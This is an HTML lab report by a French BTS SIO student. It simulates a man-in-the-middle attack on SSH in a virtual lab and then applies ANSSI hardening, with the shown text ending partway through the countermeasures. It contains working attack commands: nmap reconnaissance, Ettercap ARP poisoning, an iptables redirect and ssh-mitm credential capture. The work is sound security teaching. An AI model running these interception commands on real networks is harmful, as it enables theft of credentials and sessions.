@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>TP MITM SSH — Attaque Man-in-the-Middle</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  @media print {
+    body { margin: 0; background: white; padding: 0; }
+    .page { page-break-after: always; page-break-inside: avoid; box-shadow: none; margin: 0; }
+    .page:last-child { page-break-after: auto; }
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: #e5e7eb;
+    padding: 20px;
+    font-size: 14px;
+    color: #334155;
+  }
+
+  .page {
+    width: 210mm;
+    min-height: 297mm;
+    background: white;
+    margin: 0 auto 20px;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    overflow: hidden;
+  }
+
+  /* HEADER */
+  .pg-header {
+    background: #0a1628;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-shrink: 0;
+  }
+  .pg-header-left  { font-size: 9px; font-weight: 700; color: white; letter-spacing: .04em; }
+  .pg-header-right { font-size: 8px; color: #94a3b8; }
+  .pg-header-accent { height: 3px; background: linear-gradient(90deg, #7c3aed, #ec4899); }
+
+  /* BODY */
+  .pg-body {
+    flex: 1;
+    padding: 18px 22px 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 11px;
+  }
+
+  /* FOOTER */
+  .pg-footer {
+    background: #f1f5f9;
+    border-top: 1px solid #e2e8f0;
+    padding: 6px 22px;
+    text-align: center;
+    font-size: 8px;
+    color: #94a3b8;
+    flex-shrink: 0;
+  }
+
+  /* COVER */
+  .cover-block {
+    background: #0a1628;
+    border-radius: 12px;
+    padding: 26px 28px 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .cover-block::before {
+    content: '';
+    position: absolute;
+    top: -40px; right: -40px;
+    width: 200px; height: 200px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(124,58,237,0.25), transparent 70%);
+  }
+  .cover-block::after {
+    content: '';
+    position: absolute;
+    bottom: -30px; left: 20%;
+    width: 150px; height: 150px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(236,72,153,0.15), transparent 70%);
+  }
+  .cover-tag   { font-size: 9px; font-weight: 700; color: #c4b5fd; letter-spacing: .07em; text-transform: uppercase; margin-bottom: 10px; }
+  .cover-title { font-size: 26px; font-weight: 800; color: white; line-height: 1.15; letter-spacing: -0.02em; margin-bottom: 6px; }
+  .cover-title span { color: #c4b5fd; }
+  .cover-sub   { font-size: 10px; color: #64748b; margin-bottom: 16px; }
+  .cover-meta  { display: grid; grid-template-columns: repeat(4, 1fr); }
+  .cover-meta .lbl { font-size: 8px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 2px; }
+  .cover-meta .val { font-size: 11px; font-weight: 700; color: white; }
+
+  /* SECTIONS */
+  .sec { display: flex; align-items: center; gap: 10px; }
+  .sec-num {
+    width: 24px; height: 24px; border-radius: 6px;
+    background: #7c3aed; color: white;
+    font-size: 11px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .sec-num.red    { background: #dc2626; }
+  .sec-num.teal   { background: #0d9488; }
+  .sec-num.green  { background: #16a34a; }
+  .sec-num.amber  { background: #d97706; }
+  .sec-num.pink   { background: #db2777; }
+  .sec-title { font-size: 15px; font-weight: 800; color: #0f172a; }
+  .sec-line  { flex: 1; height: 2px; background: linear-gradient(90deg, #7c3aed, transparent); border-radius: 1px; }
+  .sec-line.red   { background: linear-gradient(90deg, #dc2626, transparent); }
+  .sec-line.teal  { background: linear-gradient(90deg, #0d9488, transparent); }
+  .sec-line.green { background: linear-gradient(90deg, #16a34a, transparent); }
+  .sec-line.amber { background: linear-gradient(90deg, #d97706, transparent); }
+  .sec-line.pink  { background: linear-gradient(90deg, #db2777, transparent); }
+
+  /* THEORY */
+  .theory {
+    background: #faf5ff;
+    border: 1px solid #7c3aed;
+    border-left: 4px solid #7c3aed;
+    border-radius: 8px;
+    padding: 11px 14px;
+  }
+  .theory.red   { background: #fef2f2; border-color: #dc2626; border-left-color: #dc2626; }
+  .theory.amber { background: #fffbeb; border-color: #d97706; border-left-color: #d97706; }
+  .theory.teal  { background: #f0fdfa; border-color: #0d9488; border-left-color: #0d9488; }
+  .theory.green { background: #f0fdf4; border-color: #16a34a; border-left-color: #16a34a; }
+  .theory-title { font-size: 10px; font-weight: 800; color: #7c3aed; margin-bottom: 6px; }
+  .theory.red   .theory-title { color: #dc2626; }
+  .theory.amber .theory-title { color: #d97706; }
+  .theory.teal  .theory-title { color: #0d9488; }
+  .theory.green .theory-title { color: #16a34a; }
+  .theory p { font-size: 10px; color: #475569; line-height: 1.65; margin-bottom: 3px; }
+  .theory p:last-child { margin-bottom: 0; }
+
+  /* FIGURE LABEL */
+  .fig-label {
+    display: inline-flex; align-items: center;
+    background: #7c3aed; color: white;
+    font-size: 9px; font-weight: 700;
+    padding: 4px 12px; border-radius: 6px; margin-bottom: 4px;
+  }
+  .fig-label.red   { background: #dc2626; }
+  .fig-label.teal  { background: #0d9488; }
+  .fig-label.green { background: #16a34a; }
+  .fig-label.amber { background: #d97706; }
+  .fig-label.pink  { background: #db2777; }
+
+  /* CODE */
+  .code-wrap { position: relative; }
+  .code-badge { position: absolute; top: 6px; right: 10px; font-size: 7.5px; font-weight: 700; color: #64748b; font-family: monospace; }
+  pre {
+    background: #0f172a;
+    border-radius: 8px;
+    padding: 13px 13px 9px;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 9px;
+    line-height: 1.65;
+    overflow: hidden;
+  }
+  .kw  { color: #a78bfa; font-weight: bold; }
+  .val { color: #86efac; }
+  .cmt { color: #64748b; font-style: italic; }
+  .ti  { color: #38bdf8; font-weight: bold; }
+  .tx  { color: #e2e8f0; }
+  .err { color: #fca5a5; font-weight: bold; }
+  .ok  { color: #86efac; font-weight: bold; }
+  .warn-c { color: #fbbf24; font-weight: bold; }
+
+  /* EXPLICATION */
+  .expl {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-left: 4px solid #7c3aed;
+    border-radius: 8px;
+    padding: 11px 14px;
+    display: flex; flex-direction: column; gap: 7px;
+  }
+  .expl.red   { border-left-color: #dc2626; }
+  .expl.teal  { border-left-color: #0d9488; }
+  .expl.green { border-left-color: #16a34a; }
+  .expl.amber { border-left-color: #d97706; }
+  .expl-label     { font-size: 9px; font-weight: 800; }
+  .expl-label.cmd { color: #7c3aed; }
+  .expl-label.cmd.red   { color: #dc2626; }
+  .expl-label.cmd.teal  { color: #0d9488; }
+  .expl-label.cmd.green { color: #16a34a; }
+  .expl-label.cmd.amber { color: #d97706; }
+  .expl-label.why { color: #d97706; }
+  .expl-label.res { color: #16a34a; }
+  .expl-cmd  { font-family: monospace; font-size: 9px; font-weight: 700; color: #0f172a; background: #e2e8f0; padding: 3px 8px; border-radius: 4px; display: inline-block; margin-top: 2px; }
+  .expl-text { font-size: 9.5px; color: #475569; line-height: 1.6; }
+  .expl-row  { display: flex; flex-direction: column; gap: 2px; }
+
+  /* ENV GRID */
+  .env-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+  .env-item { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; padding: 8px 10px; }
+  .env-lbl  { font-size: 8px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 2px; }
+  .env-val  { font-size: 10px; font-weight: 700; color: #0f172a; }
+
+  /* ATTACK SCHEMA */
+  .schema {
+    background: #f8fafc; border: 1px solid #e2e8f0;
+    border-radius: 8px; padding: 12px 16px;
+    display: flex; justify-content: center; align-items: center; gap: 8px;
+    flex-wrap: wrap;
+  }
+  .schema-step {
+    display: flex; flex-direction: column; align-items: center; gap: 5px;
+    text-align: center; min-width: 70px;
+  }
+  .schema-ico {
+    width: 40px; height: 40px; border-radius: 10px;
+    display: flex; align-items: center; justify-content: center; font-size: 18px;
+  }
+  .schema-ico.purple { background: #f5f3ff; }
+  .schema-ico.red    { background: #fef2f2; }
+  .schema-ico.teal   { background: #f0fdfa; }
+  .schema-ico.green  { background: #f0fdf4; }
+  .schema-label { font-size: 9px; font-weight: 700; color: #0f172a; }
+  .schema-sub   { font-size: 8px; color: #64748b; }
+  .schema-arrow { font-size: 16px; color: #94a3b8; }
+
+  /* PHASES GRID */
+  .phases { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .phase-block { border-radius: 8px; padding: 11px 12px; border-left: 4px solid; }
+  .phase-block.attack  { background: #fef2f2; border-color: #dc2626; }
+  .phase-block.defense { background: #f0fdf4; border-color: #16a34a; }
+  .phase-title { font-size: 10px; font-weight: 800; margin-bottom: 5px; }
+  .phase-block.attack  .phase-title { color: #dc2626; }
+  .phase-block.defense .phase-title { color: #16a34a; }
+  .phase-block p { font-size: 9px; color: #475569; line-height: 1.55; margin-bottom: 3px; }
+
+  /* CMD LIST */
+  .cmd-list { display: flex; flex-direction: column; gap: 7px; }
+  .cmd-item { display: flex; gap: 10px; align-items: flex-start; padding: 8px 11px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 7px; }
+  .cmd-item-code { font-family: monospace; font-size: 8.5px; font-weight: 700; color: #7c3aed; background: #f5f3ff; padding: 2px 7px; border-radius: 4px; white-space: nowrap; flex-shrink: 0; }
+  .cmd-item-code.red  { color: #dc2626; background: #fef2f2; }
+  .cmd-item-code.teal { color: #0d9488; background: #f0fdfa; }
+  .cmd-item-desc { font-size: 9px; color: #475569; line-height: 1.55; }
+
+  /* TABLE */
+  table { width: 100%; border-collapse: collapse; font-size: 9px; }
+  thead tr { background: #7c3aed; color: white; }
+  thead th  { padding: 7px 8px; text-align: left; font-weight: 700; }
+  tbody tr:nth-child(even) { background: #f8fafc; }
+  tbody td  { padding: 6px 8px; border-bottom: 1px solid #f1f5f9; color: #334155; vertical-align: top; }
+  tbody td:first-child { font-weight: 800; color: #7c3aed; }
+  tbody td.attack  { color: #dc2626; font-weight: 700; }
+  tbody td.defense { color: #16a34a; font-weight: 700; }
+
+  /* RESULT */
+  .result-box { background: #f0fdf4; border: 2px solid #16a34a; border-radius: 10px; padding: 14px; text-align: center; }
+  .result-box .r-title { font-size: 13px; font-weight: 800; color: #16a34a; margin-bottom: 6px; }
+  .result-box p { font-size: 9.5px; color: #475569; line-height: 1.6; }
+
+  /* WARN */
+  .warn { background: #fef2f2; border: 1px solid #dc2626; border-left: 4px solid #dc2626; border-radius: 8px; padding: 10px 14px; }
+  .warn-title { font-size: 10px; font-weight: 800; color: #dc2626; margin-bottom: 4px; }
+  .warn p { font-size: 9.5px; color: #475569; line-height: 1.55; }
+
+  .intro-text { font-size: 10px; color: #475569; line-height: 1.7; }
+  code { font-family: monospace; font-size: 9px; background: #f1f5f9; padding: 1px 5px; border-radius: 3px; color: #0f172a; }
+</style>
+</head>
+<body>
+
+<!-- ════════ PAGE 1 — COVER + OBJECTIFS + MAQUETTE ════════ -->
+<div class="page">
+  <div class="pg-header">
+    <div class="pg-header-left">TP MITM SSH — ATTAQUE MAN-IN-THE-MIDDLE SUR SSH</div>
+    <div class="pg-header-right">Bloc 3 — Cybersécurité — BTS SIO 2e année — Aouizir Chahine</div>
+  </div>
+  <div class="pg-header-accent"></div>
+  <div class="pg-body">
+
+    <div class="cover-block">
+      <div class="cover-tag">Bloc 3 — Cybersécurité des services informatiques — BTS SIO SISR</div>
+      <div class="cover-title">TP — Attaque <span>Man-in-the-Middle</span><br>sur un service SSH</div>
+      <div class="cover-sub">Simulation d'attaque ARP Spoofing + ssh-mitm — puis mise en place des contre-mesures ANSSI</div>
+      <div class="cover-meta">
+        <div><div class="lbl">Étudiant</div><div class="val">Aouizir Chahine</div></div>
+        <div><div class="lbl">Environnement</div><div class="val">VirtualBox / Kali</div></div>
+        <div><div class="lbl">Outil attaque</div><div class="val">Ettercap + ssh-mitm</div></div>
+        <div><div class="lbl">Option</div><div class="val">BTS SIO SISR</div></div>
+      </div>
+    </div>
+
+    <!-- Section 1 — Objectifs -->
+    <div class="sec"><div class="sec-num">1</div><div class="sec-title">Objectifs du TP</div><div class="sec-line"></div></div>
+
+    <div class="phases">
+      <div class="phase-block attack">
+        <div class="phase-title">⚔️ Phase offensive</div>
+        <p>Comprendre comment une attaque MITM peut être mise en œuvre sur SSH quand les bonnes pratiques ne sont pas respectées.</p>
+        <p>Identifier les faiblesses de l'authentification par mot de passe et du protocole ARP.</p>
+      </div>
+      <div class="phase-block defense">
+        <div class="phase-title">🛡️ Phase défensive</div>
+        <p>Mettre en œuvre des solutions concrètes pour sécuriser un serveur SSH selon l'état de l'art ANSSI.</p>
+        <p>Comprendre le mécanisme SSHFP et l'authentification par clés cryptographiques.</p>
+      </div>
+    </div>
+
+    <!-- Schéma global de l'attaque -->
+    <div class="schema">
+      <div class="schema-step">
+        <div class="schema-ico teal">💻</div>
+        <div class="schema-label">Client SSH</div>
+        <div class="schema-sub">Debian — victime</div>
+      </div>
+      <div class="schema-arrow">⟵ ARP poison ⟶</div>
+      <div class="schema-step">
+        <div class="schema-ico red">🎭</div>
+        <div class="schema-label">Kali Linux</div>
+        <div class="schema-sub">Attaquant MITM</div>
+      </div>
+      <div class="schema-arrow">⟵ ARP poison ⟶</div>
+      <div class="schema-step">
+        <div class="schema-ico purple">🖥️</div>
+        <div class="schema-label">Serveur SSH</div>
+        <div class="schema-sub">Debian — cible</div>
+      </div>
+      <div class="schema-arrow">🔀</div>
+      <div class="schema-step">
+        <div class="schema-ico green">🌐</div>
+        <div class="schema-label">Routeur</div>
+        <div class="schema-sub">OpenBSD</div>
+      </div>
+    </div>
+
+    <!-- Section 2 — Maquette -->
+    <div class="sec"><div class="sec-num amber">2</div><div class="sec-title">Présentation de la maquette</div><div class="sec-line amber"></div></div>
+    <div class="env-grid">
+      <div class="env-item"><div class="env-lbl">Serveur SSH</div><div class="env-val">Debian (cible)</div></div>
+      <div class="env-item"><div class="env-lbl">Client SSH</div><div class="env-val">Debian (victime)</div></div>
+      <div class="env-item"><div class="env-lbl">Attaquant</div><div class="env-val">Kali Linux</div></div>
+      <div class="env-item"><div class="env-lbl">Routeur</div><div class="env-val">OpenBSD</div></div>
+      <div class="env-item"><div class="env-lbl">Hyperviseur</div><div class="env-val">VirtualBox</div></div>
+      <div class="env-item"><div class="env-lbl">Outils attaque</div><div class="env-val">Nmap, Ettercap, ssh-mitm</div></div>
+    </div>
+
+    <!-- Section 3 — SSH et TOFU -->
+    <div class="sec"><div class="sec-num">3</div><div class="sec-title">Protocole SSH et modèle TOFU</div><div class="sec-line"></div></div>
+    <div class="theory">
+      <div class="theory-title">Qu'est-ce que le modèle TOFU (Trust On First Use) ?</div>
+      <p>Lors de la <strong>première connexion SSH</strong>, le client reçoit la clé publique du serveur et demande à l'utilisateur de l'accepter ou non.</p>
+      <p>Si l'utilisateur accepte sans vérifier → la clé est mémorisée dans <code>~/.ssh/known_hosts</code> → toutes les connexions suivantes font confiance à cette clé.</p>
+      <p><strong>Risque :</strong> si un attaquant MITM intercepte la première connexion, il peut substituer sa propre clé → l'utilisateur lui fait confiance sans le savoir.</p>
+    </div>
+
+  </div>
+  <div class="pg-footer">Compte rendu TP MITM SSH — BTS SIO 2e année — Aouizir Chahine — Page 1 / 5</div>
+</div>
+
+<!-- ════════ PAGE 2 — RECONNAISSANCE + ARP SPOOFING ════════ -->
+<div class="page">
+  <div class="pg-header">
+    <div class="pg-header-left">TP MITM SSH — ATTAQUE MAN-IN-THE-MIDDLE SUR SSH</div>
+    <div class="pg-header-right">Bloc 3 — Cybersécurité — BTS SIO 2e année — Aouizir Chahine</div>
+  </div>
+  <div class="pg-header-accent"></div>
+  <div class="pg-body">
+
+    <!-- Section 4 — Reconnaissance -->
+    <div class="sec"><div class="sec-num red">4</div><div class="sec-title">Reconnaissance réseau — Nmap</div><div class="sec-line red"></div></div>
+
+    <div class="theory red">
+      <div class="theory-title">Pourquoi la reconnaissance est-elle la première étape ?</div>
+      <p>Avant toute attaque, un attaquant doit <strong>cartographier le réseau</strong> pour identifier les hôtes actifs, les ports ouverts et les versions de services.</p>
+      <p>Nmap permet d'obtenir ces informations en quelques secondes — ce qui facilite le ciblage d'un serveur vulnérable.</p>
+    </div>
+
+    <div>
+      <div class="fig-label red">Figure 1 — Scan réseau avec Nmap (depuis Kali Linux)</div>
+      <div class="code-wrap">
+        <div class="code-badge">Kali Linux — Reconnaissance</div>
+        <pre><span class="cmt"># Scan de tout le sous-réseau pour trouver les hôtes actifs</span>
+<span class="tx">kali# </span><span class="kw">nmap -sn 192.168.1.0/24</span>
+
+<span class="cmt"># Résultat attendu dans la capture :</span>
+<span class="ok">Nmap scan report for 192.168.1.10  (Serveur SSH — Debian)</span>
+<span class="ok">Nmap scan report for 192.168.1.20  (Client SSH — Debian)</span>
+<span class="ok">Nmap scan report for 192.168.1.1   (Routeur OpenBSD)</span>
+
+<span class="cmt"># Scanner les ports et versions du serveur SSH ciblé</span>
+<span class="tx">kali# </span><span class="kw">nmap -sV -p 22 192.168.1.10</span>
+
+<span class="cmt"># Résultat attendu :</span>
+<span class="ti">PORT   STATE  SERVICE  VERSION</span>
+<span class="val">22/tcp open   ssh      OpenSSH 8.x (Debian)</span></pre>
+      </div>
+    </div>
+
+    <div class="expl red">
+      <div class="expl-row"><div class="expl-label cmd red">⌨ Commande(s) utilisée(s)</div><div class="expl-cmd">nmap -sn 192.168.1.0/24  /  nmap -sV -p 22 &lt;ip&gt;</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi ces commandes ?</div><div class="expl-text"><code>-sn</code> → scan de découverte sans port scan (ping sweep) pour lister les hôtes actifs.<br><code>-sV -p 22</code> → détecte la version exacte du service SSH pour identifier des vulnérabilités connues.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">L'attaquant connaît les IP du client et du serveur SSH — il peut maintenant préparer l'attaque ARP Spoofing.</div></div>
+    </div>
+
+    <!-- Section 5 — ARP Spoofing -->
+    <div class="sec"><div class="sec-num red">5</div><div class="sec-title">Mise en œuvre de l'ARP Spoofing — Ettercap</div><div class="sec-line red"></div></div>
+
+    <div class="theory red">
+      <div class="theory-title">Qu'est-ce que l'ARP Spoofing ?</div>
+      <p>Le protocole ARP associe une adresse IP à une adresse MAC sur un réseau local. Il n'y a <strong>aucune authentification</strong> dans ARP.</p>
+      <p>L'attaquant envoie de fausses réponses ARP au client et au serveur pour leur faire croire que <strong>sa MAC est celle de l'autre</strong>.</p>
+      <p>Résultat : tout le trafic passe par la machine Kali → l'attaquant est au milieu de la communication (<strong>Man-in-the-Middle</strong>).</p>
+    </div>
+
+    <div>
+      <div class="fig-label red">Figure 2 — Activation du routage IP et ARP Spoofing avec Ettercap</div>
+      <div class="code-wrap">
+        <div class="code-badge">Kali Linux — ARP Spoofing</div>
+        <pre><span class="cmt"># Étape 1 : Activer le routage IP pour ne pas couper la communication</span>
+<span class="tx">kali# </span><span class="kw">echo 1 > /proc/sys/net/ipv4/ip_forward</span>
+<span class="cmt"># Sans ip_forward, les paquets ne seraient pas retransmis → coupure réseau</span>
+
+<span class="cmt"># Étape 2 : Lancer l'ARP Spoofing avec Ettercap (mode texte)</span>
+<span class="tx">kali# </span><span class="kw">ettercap -T -M arp:remote /192.168.1.20/ /192.168.1.10/</span>
+<span class="cmt"># -T    : mode texte (terminal)</span>
+<span class="cmt"># -M arp:remote : attaque MITM par empoisonnement ARP</span>
+<span class="cmt"># /IP1/ : IP du client (victime)</span>
+<span class="cmt"># /IP2/ : IP du serveur SSH (cible)</span>
+
+<span class="cmt"># Résultat dans la capture :</span>
+<span class="warn-c">ARP poisoning victims:</span>
+<span class="warn-c"> GROUP 1 : 192.168.1.20 (Client)</span>
+<span class="warn-c"> GROUP 2 : 192.168.1.10 (Serveur SSH)</span>
+<span class="ok">Starting Unified sniffing...</span></pre>
+      </div>
+    </div>
+
+    <div class="expl red">
+      <div class="expl-row"><div class="expl-label cmd red">⌨ Commande(s) utilisée(s)</div><div class="expl-cmd">echo 1 > /proc/sys/net/ipv4/ip_forward  +  ettercap -T -M arp:remote /IP_client/ /IP_serveur/</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi ces commandes ?</div><div class="expl-text"><code>ip_forward=1</code> → indispensable : sans ça, les paquets seraient bloqués sur Kali → détection immédiate par coupure réseau.<br><code>ettercap -M arp:remote</code> → empoisonne les tables ARP du client ET du serveur simultanément, forçant tout le trafic à transiter par Kali.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">Tout le trafic entre le client et le serveur SSH passe maintenant par la machine Kali — l'attaquant est au milieu.</div></div>
+    </div>
+
+  </div>
+  <div class="pg-footer">Compte rendu TP MITM SSH — BTS SIO 2e année — Aouizir Chahine — Page 2 / 5</div>
+</div>
+
+<!-- ════════ PAGE 3 — SSH-MITM ET CAPTURE ════════ -->
+<div class="page">
+  <div class="pg-header">
+    <div class="pg-header-left">TP MITM SSH — ATTAQUE MAN-IN-THE-MIDDLE SUR SSH</div>
+    <div class="pg-header-right">Bloc 3 — Cybersécurité — BTS SIO 2e année — Aouizir Chahine</div>
+  </div>
+  <div class="pg-header-accent"></div>
+  <div class="pg-body">
+
+    <!-- Section 6 — ssh-mitm -->
+    <div class="sec"><div class="sec-num red">6</div><div class="sec-title">Exploitation — Interception SSH avec ssh-mitm</div><div class="sec-line red"></div></div>
+
+    <div class="theory red">
+      <div class="theory-title">Comment ssh-mitm intercepte-t-il une session chiffrée ?</div>
+      <p>SSH est chiffré — mais si le client ne vérifie pas l'identité du serveur (modèle TOFU), l'attaquant peut <strong>présenter sa propre clé</strong> au client.</p>
+      <p>Le client croit parler au vrai serveur → il envoie son mot de passe → <strong>ssh-mitm le capture en clair</strong> avant de le transmettre au vrai serveur.</p>
+      <p>Le serveur ne voit rien d'anormal — la connexion est maintenue.</p>
+    </div>
+
+    <div>
+      <div class="fig-label red">Figure 3 — Redirection de port et lancement de ssh-mitm</div>
+      <div class="code-wrap">
+        <div class="code-badge">Kali Linux — ssh-mitm</div>
+        <pre><span class="cmt"># Rediriger le port SSH vers ssh-mitm (avant qu'il atteigne le vrai serveur)</span>
+<span class="tx">kali# </span><span class="kw">iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 10022</span>
+
+<span class="cmt"># Lancer ssh-mitm sur le port 10022</span>
+<span class="tx">kali# </span><span class="kw">ssh-mitm --listen-port 10022</span>
+
+<span class="cmt"># Résultat dans la capture quand le client se connecte :</span>
+<span class="warn-c">[*] SSH interception started on port 10022</span>
+<span class="err">[!] Client connected: 192.168.1.20</span>
+<span class="err">[!] Credentials captured:</span>
+<span class="err">    Username : admin</span>
+<span class="err">    Password : motdepasse123</span>
+<span class="warn-c">[*] Forwarding session to real server 192.168.1.10:22</span></pre>
+      </div>
+    </div>
+
+    <div class="expl red">
+      <div class="expl-row"><div class="expl-label cmd red">⌨ Commande(s) utilisée(s)</div><div class="expl-cmd">iptables -t nat -A PREROUTING --dport 22 -j REDIRECT --to-port 10022  +  ssh-mitm --listen-port 10022</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi ces commandes ?</div><div class="expl-text"><code>iptables REDIRECT</code> → intercepte les connexions SSH (port 22) et les redirige vers ssh-mitm (port 10022) sur Kali, de façon transparente.<br><code>ssh-mitm</code> → agit comme un faux serveur SSH, capture les identifiants en clair, puis retransmet la connexion au vrai serveur.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">Les identifiants SSH (login + mot de passe) sont capturés en clair dans la console de ssh-mitm — même si SSH est un protocole chiffré.</div></div>
+    </div>
+
+    <div>
+      <div class="fig-label red">Figure 4 — Capture des commandes exécutées sur le serveur</div>
+      <div class="code-wrap">
+        <div class="code-badge">ssh-mitm — Session capturée</div>
+        <pre><span class="cmt"># Journal ssh-mitm : toutes les commandes tapées par la victime sont visibles</span>
+<span class="warn-c">[*] Session established for user: admin</span>
+<span class="err">[!] Command captured: ls -la /etc/ssh/</span>
+<span class="err">[!] Command captured: cat /etc/passwd</span>
+<span class="err">[!] Command captured: sudo reboot</span>
+
+<span class="cmt"># La victime ne voit rien d'anormal — sa session SSH fonctionne normalement</span>
+<span class="cmt"># Mais l'attaquant voit TOUT : commandes, résultats, fichiers consultés</span></pre>
+      </div>
+    </div>
+
+    <div class="expl red">
+      <div class="expl-row"><div class="expl-label cmd red">⌨ Ce qui est capturé</div><div class="expl-cmd">Identifiants + toutes les commandes exécutées sur le serveur distant</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi SSH peut-il être compromis malgré le chiffrement ?</div><div class="expl-text">SSH chiffre le tunnel — mais si l'identité du serveur n'est pas vérifiée, l'attaquant se glisse entre les deux. Le chiffrement ne protège pas contre le MITM : il protège contre l'écoute passive, pas contre l'usurpation d'identité.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">Preuves que même un protocole chiffré peut être compromis si l'identité du serveur n'est pas vérifiée par le client.</div></div>
+    </div>
+
+  </div>
+  <div class="pg-footer">Compte rendu TP MITM SSH — BTS SIO 2e année — Aouizir Chahine — Page 3 / 5</div>
+</div>
+
+<!-- ════════ PAGE 4 — CONTRE-MESURES ════════ -->
+<div class="page">
+  <div class="pg-header">
+    <div class="pg-header-left">TP MITM SSH — ATTAQUE MAN-IN-THE-MIDDLE SUR SSH</div>
+    <div class="pg-header-right">Bloc 3 — Cybersécurité — BTS SIO 2e année — Aouizir Chahine</div>
+  </div>
+  <div class="pg-header-accent"></div>
+  <div class="pg-body">
+
+    <!-- Section 7 — Contre-mesures -->
+    <div class="sec"><div class="sec-num green">7</div><div class="sec-title">Contre-mesures — Authentification par clés</div><div class="sec-line green"></div></div>
+
+    <div class="theory green">
+      <div class="theory-title">Pourquoi les clés cryptographiques remplacent les mots de passe ?</div>
+      <p>Avec un mot de passe : celui-ci transite sur le réseau (même chiffré) → ssh-mitm peut le capturer au moment de l'authentification.</p>
+      <p>Avec une clé SSH : <strong>aucun secret ne transite</strong> — le client prouve son identité avec sa clé privée (jamais envoyée), le serveur vérifie avec la clé publique. Impossible à intercepter.</p>
+    </div>
+
+    <div>
+      <div class="fig-label green">Figure 5 — Génération et déploiement des clés SSH</div>
+      <div class="code-wrap">
+        <div class="code-badge">Client Debian — Clés SSH</div>
+        <pre><span class="cmt"># Sur le client : générer une paire de clés (ED25519 recommandé par ANSSI)</span>
+<span class="tx">client$ </span><span class="kw">ssh-keygen -t ed25519 -C "chahine@bts-sio"</span>
+<span class="cmt"># Génère : ~/.ssh/id_ed25519 (clé privée) + ~/.ssh/id_ed25519.pub (clé publique)</span>
+
+<span class="cmt"># Copier la clé publique sur le serveur</span>
+<span class="tx">client$ </span><span class="val">ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@192.168.1.10</span>
+<span class="cmt"># La clé publique est ajoutée dans ~/.ssh/authorized_keys sur le serveur</span>
+
+<span class="cmt"># Vérifier les droits des fichiers (SSH refuse si trop permissifs)</span>
+<span class="tx">client$ </span><span class="kw">chmod 600 ~/.ssh/id_ed25519</span>
+<span class="tx">client$ </span><span class="kw">chmod 644 ~/.ssh/id_ed25519.pub</span>
+
+<span class="cmt"># Connexion sans mot de passe :</span>
+<span class="tx">client$ </span><span class="val">ssh -i ~/.ssh/id_ed25519 admin@192.168.1.10</span>
+<span class="ok">admin@serveur:~$    # Connexion établie sans saisir de mot de passe !</span></pre>
+      </div>
+    </div>
+
+    <div class="expl green">
+      <div class="expl-row"><div class="expl-label cmd green">⌨ Commande(s) utilisée(s)</div><div class="expl-cmd">ssh-keygen -t ed25519  /  ssh-copy-id  /  chmod 600</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi ed25519 et pas RSA ?</div><div class="expl-text"><code>ed25519</code> est recommandé par l'ANSSI : clé plus courte mais plus sécurisée que RSA 2048. <code>chmod 600</code> est obligatoire — SSH refuse de fonctionner si la clé privée est lisible par d'autres utilisateurs.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">La connexion SSH fonctionne sans mot de passe — même si un attaquant intercepte le trafic, il ne peut rien capturer d'utile.</div></div>
+    </div>
+
+    <!-- Section 8 — Durcissement sshd_config -->
+    <div class="sec"><div class="sec-num green">8</div><div class="sec-title">Durcissement sshd_config — Recommandations ANSSI</div><div class="sec-line green"></div></div>
+
+    <div>
+      <div class="fig-label green">Figure 6 — Configuration sshd_config durcie</div>
+      <div class="code-wrap">
+        <div class="code-badge">Serveur Debian — /etc/ssh/sshd_config</div>
+        <pre><span class="cmt"># Désactiver l'authentification par mot de passe (clés uniquement)</span>
+<span class="val">PasswordAuthentication no</span>
+<span class="val">ChallengeResponseAuthentication no</span>
+
+<span class="cmt"># Désactiver la connexion root directe</span>
+<span class="kw">PermitRootLogin no</span>
+
+<span class="cmt"># Utiliser uniquement les algorithmes recommandés ANSSI</span>
+<span class="val">KexAlgorithms curve25519-sha256,diffie-hellman-group-exchange-sha256</span>
+<span class="val">Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com</span>
+<span class="val">MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com</span>
+
+<span class="cmt"># Limiter les tentatives et le délai d'authentification</span>
+<span class="kw">MaxAuthTries 3</span>
+<span class="kw">LoginGraceTime 30</span>
+
+<span class="cmt"># Appliquer les changements</span>
+<span class="tx">server# </span><span class="kw">systemctl restart sshd</span></pre>
+      </div>
+    </div>
+
